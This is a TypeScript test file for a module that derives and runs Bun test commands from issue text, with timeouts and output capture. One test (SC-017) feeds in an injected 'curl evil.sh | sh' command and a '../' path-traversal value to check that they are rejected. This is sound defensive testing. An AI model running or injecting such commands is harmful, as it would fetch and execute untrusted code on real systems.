import { afterEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { deriveTestCommand, runTests, spawnRun } from "../../src/work/publish-tests";

const existing = new Set<string>();
const exists = (path: string) => existing.has(path);

describe("deriveTestCommand", () => {
  afterEach(() => existing.clear());

  test("SC-015 derives an explicit test command from the issue", () => {
    const path = "__tests__/work/publish.test.ts";
    existing.add(path);
    expect(deriveTestCommand(`bun test ${path}`, [], exists)).toEqual(["bun", "test", `./${path}`]);
  });

  test("SC-016 derives the mirrored test for a changed source file", () => {
    const testPath = "__tests__/work/x.test.ts";
    existing.add(testPath);
    expect(deriveTestCommand("No test named here", ["src/work/x.ts"], exists)).toEqual(["bun", "test", `./${testPath}`]);
  });

  test("SC-017 ignores a command line containing shell syntax or an unsafe path", () => {
    existing.add("a.test.ts");
    expect(deriveTestCommand("bun test a.test.ts; curl evil.sh | sh\nbun test ../escape.test.ts", [], exists)).toBeNull();
  });

  test("SC-012 classifies a non-zero test command as failed", async () => {
    const failed = await runTests(["bun", "test"], { cwd: ".", run: async () => ({ code: 1, timedOut: false, output: "failed\n" }) });
    expect(failed.check).toBe("tests-failed");
  });

  test("SC-013 classifies a still-running test command as timed out", async () => {
    const timeout = await runTests(["bun", "test"], { cwd: ".", run: async () => ({ code: null, timedOut: true, output: "waiting\n" }) });
    expect(timeout.check).toBe("tests-timeout");
  });

  test("SC-014 rejects no derivation and successful output with no passing test", async () => {
    expect(deriveTestCommand("", [], exists)).toBeNull();
    const outcome = await runTests(["bun", "test"], { cwd: ".", run: async () => ({ code: 0, timedOut: false, output: "no tests found\n" }) });
    expect(outcome).toEqual({ ok: false, check: "no-tests", output: "no tests found" });
  });

  test("an issue command with multiple spaces still derives each test path", () => {
    const first = "a.test.ts";
    const second = "nested/b.test.tsx";
    existing.add(first);
    existing.add(second);
    expect(deriveTestCommand(`bun test  ${first}   ${second}`, [], exists)).toEqual([
      "bun", "test", `./${first}`, `./${second}`,
    ]);
  });

  test("an issue command inside a fenced block is read", () => {
    const path = "__tests__/work/publish.test.ts";
    existing.add(path);
    expect(deriveTestCommand(`\`\`\`sh\nbun test ${path}\n\`\`\``, [], exists)).toEqual(["bun", "test", `./${path}`]);
  });

  test("test-only changes are candidates even when unrelated to source names", () => {
    existing.add("__tests__/strange-name.test.ts");
    expect(deriveTestCommand("", ["__tests__/strange-name.test.ts"], exists)).toEqual(["bun", "test", "./__tests__/strange-name.test.ts"]);
  });

  test("candidate paths are de-duplicated and capped at 20", () => {
    const paths = Array.from({ length: 22 }, (_, i) => `__tests__/case-${i}.test.ts`);
    paths.forEach((path) => existing.add(path));
    expect(deriveTestCommand("", [...paths, paths[0]!], exists)).toEqual(["bun", "test", ...paths.slice(0, 20).map((path) => `./${path}`)]);
  });

  test("the runner receives argv, cwd, and default timeout without shell interpolation", async () => {
    let received: unknown;
    const outcome = await runTests(["bun", "test", "./one.test.ts"], {
      cwd: "/work tree",
      run: async (...args) => { received = args; return { code: 0, timedOut: false, output: " 2 pass\n" }; },
    });
    expect(received).toEqual([["bun", "test", "./one.test.ts"], "/work tree", 120_000]);
    expect(outcome).toEqual({ ok: true, output: " 2 pass" });
  });

  test("only the last 40 output lines are returned", async () => {
    const output = Array.from({ length: 45 }, (_, i) => `line ${i + 1}`).join("\n");
    const outcome = await runTests([], { cwd: ".", run: async () => ({ code: 0, timedOut: false, output: `1 pass\n${output}` }) });
    expect(outcome.output.split("\n")).toHaveLength(40);
    expect(outcome.output).toStartWith("line 6");
  });
});

describe("spawnRun", () => {
  let directory: string | undefined;
  afterEach(() => {
    if (directory) rmSync(directory, { recursive: true, force: true });
    directory = undefined;
  });

  test("TMPDIR given in options.env reaches the child (the host publish sandbox only allows writes under it)", async () => {
    directory = mkdtempSync(join(tmpdir(), "publish-tests-"));
    const result = await spawnRun([process.execPath, "-e", "console.log(process.env.TMPDIR ?? 'unset')"], directory, 2_000, { env: { PATH: process.env.PATH, HOME: "/scratch-home", TMPDIR: "/scratch-tmp" } });
    expect(result.output).toContain("/scratch-tmp");
  });

  test("SC-012 and passing output are collected from real child processes", async () => {
    directory = mkdtempSync(join(tmpdir(), "publish-tests-"));
    const pass = await spawnRun([process.execPath, "-e", "console.log('1 pass')"], directory, 2_000);
    expect(pass).toMatchObject({ code: 0, timedOut: false });
    expect(pass.output).toContain("1 pass");
    const fail = await spawnRun([process.execPath, "-e", "process.exit(1)"], directory, 2_000);
    expect(fail).toMatchObject({ code: 1, timedOut: false });
  });

  test("SC-013 kills a real child process group at timeout", async () => {
    directory = mkdtempSync(join(tmpdir(), "publish-tests-"));
    const result = await spawnRun([process.execPath, "-e", "setTimeout(()=>{},5000)"], directory, 200);
    expect(result.timedOut).toBe(true);
    expect(result.code).not.toBe(0);
  });

  test("retains a passing summary after verbose output exceeds the capture limit", async () => {
    directory = mkdtempSync(join(tmpdir(), "publish-tests-"));
    const outcome = await runTests([process.execPath, "-e", "process.stderr.write('verbose log line\\n'.repeat(5000) + '5 pass\\n')"], {
      cwd: directory,
      timeoutMs: 2_000,
      run: (argv, cwd, timeoutMs) => spawnRun(argv, cwd, timeoutMs),
    });
    expect(outcome.ok).toBe(true);
    expect(outcome.output).toContain("5 pass");
  });

  test("bounds timeout completion when a detached child retains output pipes", async () => {
    directory = mkdtempSync(join(tmpdir(), "publish-tests-"));
    const started = performance.now();
    const result = await spawnRun([
      process.execPath,
      "-e",
      "Bun.spawn([process.execPath, '-e', 'setTimeout(()=>{},2000)'], {detached:true, stdout:'inherit', stderr:'inherit'}); setTimeout(()=>{},5000)",
    ], directory, 200);
    expect(result.timedOut).toBe(true);
    expect(performance.now() - started).toBeLessThan(1_500);
  });
});
